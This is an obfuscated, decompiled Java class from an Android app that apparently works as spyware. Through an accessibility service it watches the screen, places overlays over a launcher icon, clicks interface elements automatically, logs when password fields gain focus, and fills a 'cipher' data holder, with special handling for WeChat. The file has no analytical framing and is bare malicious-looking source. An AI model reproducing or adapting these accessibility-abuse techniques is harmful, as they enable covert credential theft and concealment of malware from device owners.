package p000;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.Rect;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0325b0;
import com.storm.safe.rock.service.modules.cipher.C0339a5;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.service.modules.cipher.CipherDataHolder;
import com.storm.safe.rock.service.modules.cipher.ListenHelper;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.locks.ReentrantLock;
import kotlin.jvm.internal.Lambda;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: ai */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC0029ai implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f43664a0;

    /* renamed from: a1 */
    public final /* synthetic */ Object f43665a1;

    /* renamed from: a2 */
    public final /* synthetic */ Object f43666a2;

    /* renamed from: a3 */
    public final /* synthetic */ Object f43667a3;

    public /* synthetic */ RunnableC0029ai(C0341a7 c0341a7, ListenHelper listenHelper, String str) {
        this.f43664a0 = 5;
        this.f43665a1 = c0341a7;
        this.f43667a3 = listenHelper;
        this.f43666a2 = str;
    }

    /* JADX WARN: Type inference failed for: r1v17, types: [kotlin.jvm.internal.Lambda, w00] */
    @Override // java.lang.Runnable
    public final void run() {
        AccessibilityNodeInfo rootInActiveWindow = null;
        switch (this.f43664a0) {
            case 0:
                final dqtvuisjd dqtvuisjdVar = (dqtvuisjd) this.f43665a1;
                String str = (String) this.f43666a2;
                final C0032al c0032al = (C0032al) this.f43667a3;
                t60.m214695b6(str, "$appNameTran");
                try {
                    AccessibilityNodeInfo cachedRoot = dqtvuisjd.f52358m1.getCachedRoot();
                    rootInActiveWindow = cachedRoot == null ? dqtvuisjdVar.getRootInActiveWindow() : cachedRoot;
                } catch (Exception unused) {
                }
                if (rootInActiveWindow == null) {
                    return;
                }
                try {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                    final boolean zM209815a4 = c0032al.m209815a4(listFindAccessibilityNodeInfosByText);
                    if (zM209815a4 != c0032al.f43713c1) {
                        t60.m214702c3("LauncherProtector", "📋 [文字搜索] appNameTran='" + str + "' foundApp=" + zM209815a4 + " nodeCount=" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0));
                        c0032al.f43713c1 = zM209815a4;
                    }
                    c0032al.f43699a7.post(new Runnable() { // from class: aj
                        @Override // java.lang.Runnable
                        public final void run() {
                            Rect rect;
                            C0032al c0032al2 = c0032al;
                            boolean z = zM209815a4;
                            dqtvuisjd dqtvuisjdVar2 = dqtvuisjdVar;
                            if (z && !c0032al2.f43703b1) {
                                c0032al2.f43703b1 = true;
                                RunnableC0027ag runnableC0027ag = c0032al2.f43701a9;
                                if (runnableC0027ag != null && c0032al2.f43704b2) {
                                    c0032al2.f43699a7.removeCallbacks(runnableC0027ag);
                                    c0032al2.f43701a9 = null;
                                    c0032al2.f43704b2 = false;
                                }
                                c0032al2.m209818a7();
                                c0032al2.m209811a0(dqtvuisjdVar2);
                                if (c0032al2.f43705b3) {
                                    return;
                                }
                                c0032al2.f43705b3 = true;
                                c0032al2.m209819a8();
                                return;
                            }
                            if (!z && c0032al2.f43703b1) {
                                c0032al2.f43703b1 = false;
                                c0032al2.f43705b3 = false;
                                RunnableC0027ag runnableC0027ag2 = c0032al2.f43701a9;
                                if (runnableC0027ag2 != null) {
                                    c0032al2.f43699a7.removeCallbacks(runnableC0027ag2);
                                }
                                c0032al2.f43701a9 = null;
                                RunnableC0941o6 runnableC0941o6 = c0032al2.f43702b0;
                                if (runnableC0941o6 != null) {
                                    c0032al2.f43699a7.removeCallbacks(runnableC0941o6);
                                }
                                c0032al2.f43702b0 = null;
                                if (c0032al2.f43704b2 || c0032al2.f43694a2 == null) {
                                    return;
                                }
                                c0032al2.m209817a6(0);
                                return;
                            }
                            if (z) {
                                RunnableC0027ag runnableC0027ag3 = c0032al2.f43701a9;
                                if (runnableC0027ag3 != null && c0032al2.f43704b2) {
                                    c0032al2.f43699a7.removeCallbacks(runnableC0027ag3);
                                    c0032al2.f43701a9 = null;
                                    c0032al2.f43704b2 = false;
                                }
                                if (c0032al2.f43694a2 == null) {
                                    c0032al2.m209811a0(dqtvuisjdVar2);
                                    if (c0032al2.f43705b3) {
                                        return;
                                    }
                                    c0032al2.f43705b3 = true;
                                    c0032al2.m209819a8();
                                    return;
                                }
                                if (c0032al2.f43695a3 == null || c0032al2.f43693a1 == null) {
                                    return;
                                }
                                synchronized (c0032al2.f43697a5) {
                                    rect = new Rect(c0032al2.f43696a4);
                                }
                                if (c0032al2.f43698a6.isEmpty()) {
                                    c0032al2.f43698a6.set(rect);
                                    return;
                                }
                                int iAbs = Math.abs(rect.left - c0032al2.f43698a6.left);
                                int iAbs2 = Math.abs(rect.top - c0032al2.f43698a6.top);
                                int iAbs3 = Math.abs(rect.width() - c0032al2.f43698a6.width());
                                int iAbs4 = Math.abs(rect.height() - c0032al2.f43698a6.height());
                                if (iAbs > 3 || iAbs2 > 3 || iAbs3 > 3 || iAbs4 > 3) {
                                    c0032al2.f43698a6.set(rect);
                                    try {
                                        WindowManager.LayoutParams layoutParams = c0032al2.f43695a3;
                                        if (layoutParams != null) {
                                            layoutParams.x = rect.left;
                                            layoutParams.y = rect.top - c0032al2.m209813a2();
                                            layoutParams.width = rect.width();
                                            layoutParams.height = rect.height();
                                        }
                                        WindowManager windowManager = c0032al2.f43693a1;
                                        if (windowManager != null) {
                                            windowManager.updateViewLayout(c0032al2.f43694a2, c0032al2.f43695a3);
                                        }
                                    } catch (Exception e) {
                                        t60.m214705c6("LauncherProtector", "❌ 更新覆盖层失败", e);
                                    }
                                }
                            }
                        }
                    });
                    return;
                } catch (Exception unused2) {
                    return;
                }
            case 1:
                tg0 tg0Var = (tg0) this.f43665a1;
                cq0 cq0Var = (cq0) this.f43666a2;
                ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) this.f43667a3;
                try {
                    C0563h c0563hM212479a9 = cq0.m212479a9((Context) tg0Var.f60218a1);
                    if (c0563hM212479a9 == null) {
                        throw new RuntimeException("EmojiCompat font provider not available on this device.");
                    }
                    C0516g c0516g = (C0516g) ((InterfaceC1374wf) c0563hM212479a9.f60888a1);
                    synchronized (c0516g.f56347a3) {
                        c0516g.f56349a5 = threadPoolExecutor;
                    }
                    ((InterfaceC1374wf) c0563hM212479a9.f60888a1).mo212870b4(new C1376wh(cq0Var, threadPoolExecutor));
                    return;
                } catch (Throwable th) {
                    cq0Var.mo212507c5(th);
                    threadPoolExecutor.shutdown();
                    return;
                }
            case 2:
                boolean[] zArr = (boolean[]) this.f43665a1;
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) this.f43666a2;
                CountDownLatch countDownLatch = (CountDownLatch) this.f43667a3;
                t60.m214695b6(zArr, "$result");
                t60.m214695b6(accessibilityNodeInfo, "$node");
                t60.m214695b6(countDownLatch, "$latch");
                try {
                    try {
                        boolean zPerformAction = accessibilityNodeInfo.performAction(16);
                        zArr[0] = zPerformAction;
                        if (!zPerformAction) {
                            int i = 0;
                            for (AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent(); parent != null && i < 5; parent = parent.getParent()) {
                                i++;
                                if (parent.isClickable()) {
                                    boolean zPerformAction2 = parent.performAction(16);
                                    zArr[0] = zPerformAction2;
                                    if (!zPerformAction2) {
                                    }
                                }
                            }
                        }
                    } catch (Throwable th2) {
                        countDownLatch.countDown();
                        throw th2;
                    }
                } catch (Exception unused3) {
                    zArr[0] = false;
                }
                countDownLatch.countDown();
                return;
            case 3:
                C0360a2 c0360a2 = (C0360a2) this.f43665a1;
                ?? r1 = (Lambda) this.f43667a3;
                String str2 = (String) this.f43666a2;
                ReentrantLock reentrantLock = c0360a2.f53821a6;
                if (reentrantLock.tryLock()) {
                    try {
                        try {
                            r1.invoke();
                        } catch (Exception e) {
                            t60.m214705c6("SystemOptimize", "任务 " + str2 + " 异常", e);
                        }
                        return;
                    } finally {
                        reentrantLock.unlock();
                    }
                }
                return;
            case 4:
                C0325b0 c0325b0 = (C0325b0) this.f43665a1;
                String str3 = (String) this.f43666a2;
                String str4 = (String) this.f43667a3;
                if (c0325b0.f53155a8 && !t60.m214686a2(c0325b0.f53152a5, str4)) {
                    c0325b0.m211689a0("field_switch");
                }
                C0325b0.m211686a6("聚焦: 密码输入框 [" + c0325b0.m211692a9(str3) + "]");
                return;
            case 5:
                C0341a7 c0341a7 = (C0341a7) this.f43665a1;
                ListenHelper listenHelper = (ListenHelper) this.f43667a3;
                String str5 = (String) this.f43666a2;
                t60.m214695b6(str5, "$pkg");
                WindowManager windowManager = C0339a5.f53362a0;
                AccessibilityService accessibilityService = c0341a7.f53383a0;
                if (C0339a5.f53363a1.get() != null || C0339a5.f53371a9) {
                    return;
                }
                C0339a5.f53369a7 = accessibilityService;
                ListenHelper.C0331a0 c0331a0 = ListenHelper.f53238a1;
                C0339a5.f53365a3 = c0331a0.clone(listenHelper);
                CopyOnWriteArrayList copyOnWriteArrayList = AbstractC1095q3.f59370a0;
                if (!v00.m214888a0()) {
                    if (str5.equals("com.tencent.mm")) {
                        return;
                    }
                    C0339a5.m211854a2(accessibilityService);
                    return;
                }
                C0339a5.f53372b0 = 0;
                C0339a5.f53371a9 = false;
                CipherDataHolder cipherDataHolder = C0339a5.f53364a2;
                cipherDataHolder.f53227a2.clear();
                cipherDataHolder.f53226a1.clear();
                cipherDataHolder.f53225a0 = c0331a0.clone(C0339a5.f53365a3);
                C0339a5.f53366a4 = -1;
                new Thread(new l71(accessibilityService, i)).start();
                return;
            default:
                iuzxujjtqev iuzxujjtqevVar = (iuzxujjtqev) this.f43665a1;
                String str6 = (String) this.f43666a2;
                Integer num = (Integer) this.f43667a3;
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                try {
                    if (iuzxujjtqevVar.f51958c3 == null || iuzxujjtqevVar.isFinishing() || iuzxujjtqevVar.isDestroyed()) {
                        t60.m214726f4("iuzxujjtqev", "⚠️ statusText未初始化或Activity已销毁，跳过更新");
                        return;
                    }
                    TextView textView = iuzxujjtqevVar.f51958c3;
                    if (textView == null) {
                        t60.m214724f2("statusText");
                        throw null;
                    }
                    textView.setText(str6);
                    int iIntValue = num.intValue();
                    TextView textView2 = iuzxujjtqevVar.f51958c3;
                    if (textView2 != null) {
                        textView2.setTextColor(iuzxujjtqevVar.getColor(iIntValue));
                        return;
                    } else {
                        t60.m214724f2("statusText");
                        throw null;
                    }
                } catch (Exception e2) {
                    t60.m214705c6("iuzxujjtqev", "❌ 更新statusText失败: ".concat(str6), e2);
                    return;
                }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public /* synthetic */ RunnableC0029ai(C0360a2 c0360a2, w00 w00Var, String str) {
        this.f43664a0 = 3;
        this.f43665a1 = c0360a2;
        this.f43667a3 = (Lambda) w00Var;
        this.f43666a2 = str;
    }

    public /* synthetic */ RunnableC0029ai(Object obj, Object obj2, Object obj3, int i) {
        this.f43664a0 = i;
        this.f43665a1 = obj;
        this.f43666a2 = obj2;
        this.f43667a3 = obj3;
    }
}
